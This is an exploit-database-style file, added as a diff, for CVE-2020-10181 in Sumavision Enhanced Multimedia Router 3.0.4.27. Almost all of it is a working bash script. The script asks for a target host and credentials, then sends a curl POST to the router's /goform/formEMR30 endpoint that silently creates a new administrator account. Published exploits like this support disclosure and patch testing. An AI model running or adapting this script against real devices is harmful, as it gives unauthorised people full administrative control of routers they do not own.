@@ -1,0 +1,28 @@
+# Exploit Title: Enhanced Multimedia Router 3.0.4.27 - Cross-Site Request Forgery (Add Admin)
+# Date: 2020-03-05
+# Exploit Author: Miguel Mendez Z.
+# Vendor Homepage: www.sumavision.com
+# Software Link: http://www.sumavision.com/ensite/i.php?id=29
+# Version: EMR 3.0.4.27
+# CVE : CVE-2020-10181
+
+-----------------------Exploit Bash---------------------------
+echo ""
+read -p "Set Hostname: " host
+read -p "Set username: " user
+echo "(The password should be between 6 and 32 in length)"
+read -p "Set password: " pass
+echo
+echo "[+] creating user..."
+sleep 2
+postdata=$(curl -X POST -d "type=11&cmd=3&language=0&slotNo=255&setString=$user<*1*>administrator<*1*>$pass" "http://$host/goform/formEMR30" -s | grep -i "0")
+if echo "$postdata" | grep -q "0</html>"; then
+echo "[+] http://$host/frame_en.asp"
+echo "[+] created access($user - $pass)"
+else
+echo "[-] user not created"
+fi
+------------------------------------------------------
+
+Reference:
+https://github.com/s1kr10s/Sumavision_EMR3.0/blob/master/exploit_sumavision.sh
